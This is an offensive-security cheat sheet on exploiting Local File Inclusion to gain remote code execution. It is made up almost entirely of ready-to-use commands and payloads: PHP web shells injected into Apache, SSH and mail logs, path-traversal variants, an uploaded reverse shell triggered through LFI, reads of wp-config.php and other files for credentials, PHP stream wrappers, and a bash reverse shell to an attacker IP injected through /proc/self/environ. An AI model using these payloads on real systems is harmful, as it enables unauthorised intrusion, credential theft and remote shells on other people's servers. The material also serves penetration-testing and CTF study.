# LFI

If you locate an LFI, first try to get RCE.

## Log Poisoning

### 1) Locate a writable log file

Apache Server

    /var/log/apache2/access.log

Nginx Server

    /var/log/nginx/access.log

(Check the location of the access.log file in nginx)

    /etc/nginx/nginx.conf 

### 2) Inject a payload

Inject a simple web shell payload into a request header (e.g., User-Agent or Referer) that the web server will log.

    nc -nv IP 80

Payload:

    GET /<?php system($_GET['cmd']); ?>

### 3) Execute via LFI

    http://example.com/vulnerable.php?page=/path/to/log/access.log&cmd=whoami

## Alternate poisoning method: SSH Log Poisoning

### 1) Locate the log file

    /var/log/auth.log

### 2) Poison the auth.log file

Connect to SSH port via netcat

    nc -nv IP 22

Inject payload

    <?php echo system($_GET['cmd']); ?>

### 3) Run commands via your webshell now

    http://domain.local/lfi.php?file=/var/log/auth.log?cmd=whoami

## RCE via Email

Using LFI, after enumerating users (e.g., /etc/passwd), you can attempt to execute PHP code through a mail server by embedding PHP in email data.

#### 1. Connect to the mail server

    telnet IP 25

#### 2. Inject PHP payload into the email service

    HELO localhost
    MAIL FROM:<root>
    RCPT TO:<www-data>
    DATA
    <?php echo shell_exec($_REQUEST['cmd']); ?>
    .

#### 3. Perform user enumeration if unsure about the users

    smtp-user-enum -M VRFY -U <username_list> -t <target_ip>

## Path Traversal manual payloads

Simple traversal: start with 

    ../../../../etc/passwd 

Try variants like : 

    ..//..//..//etc/passwd 
    
or 

    ..\/..\/..\/etc/passwd.

Dot+slash permutations: 

    ..././../ 
    
or 

    ..%2f..%2f..%2fetc/passwd (URL encoded).

Try Double-encoding: 

URL-encode twice if the app decodes input more than once (example: %252e%252e%252f = %2e%2e%2f).

## LFI to RCE by calling your uploaded reverse shell

If you have write access on an FTP server, you can upload your reverse shell, then call it with LFI to catch it.

### 1) Upload your reverse shell in a writable FTP share

    put php-reverse-shell.php

### 2) Using LFI, find the FTP configuration file to detect the share that your shell is uploaded.

Enumerate with ffuf

    ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -t 100 -u http://192.168.158.14/secret_information/?lang=FUZZ -fs 146

Read FTP configuration file

    http://domain.local/vulnerable.php?lang=/etc/vsftpd.conf

You might detect something like

    anon_root=/var/ftp write_enable=YES (If anonymous access is allowed for example.)

### 3) Enjoy your shell

    http://domain.local/vulnerable.php?lang=/var/ftp/pub/php-reverse-shell.php

## LFI an a WordPress application

If we detect a Wordpress application that has LFI vulnerability, we can extract the application's wp-config.php for credentials.

    /var/www/html/wp-config.php

## LFI for port knocking configuration file

    /etc/knockd.conf

Depending on the content of the file, use the knockd tool in Kali

    knockd IP PORT1 PORT2 PORT3

Test if the sequence worked

    nc -nv IP PORT

## Bonus: Wordlists

Normal fuzzing

    /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt

Fuzz GET Parameters

    /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

Fuzz PHP Files

    /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt

Fuzz Server Logs and Configs

    /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt

Fuzz Webroot

fuzz for index.php use wordlist for Linux or wordlist for windows, or this general wordlist alternative; consider that depending on our LFI situation, we may need to add a few back directories (e.g. ../../../../), and then add our index.php afterwords.

    /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt

Example: 

    ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

## LFI Wrappers

### 1) Base64 encode a file

    http://<target_url>/file.php?recurse=php://filter/convert.base64-encode/resource=<file_name>

Decode

    echo "BASE64" | base64 -d

### 2) ROT13 encoding

    http://<target_url>/file.php?recurse=php://filter/read=string.rot13/resource=<file_name>

### 3) php://data

    curl "http://<TARGET>/index.php?page=data://text/plain,<PHP_PAYLOAD>"

Encode PHP payload in base64

    echo -n '<?php echo system($_GET["cmd"]); ?>' | base64

## Reverse Shell via LFI

Inject a shell using /proc/self/environ. If the environment variables are writable, inject PHP code into the environment.

#### 1. Send PHP payload
    
    curl -X POST -d "cmd=<?php system('bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'); ?>" http://<target_url>/file.php?recurse=../../../../../proc/self/environ

#### 2. Access the file via LFI to trigger the reverse shell

    http://<target_url>/file.php?recurse=../../../../../proc/self/environ
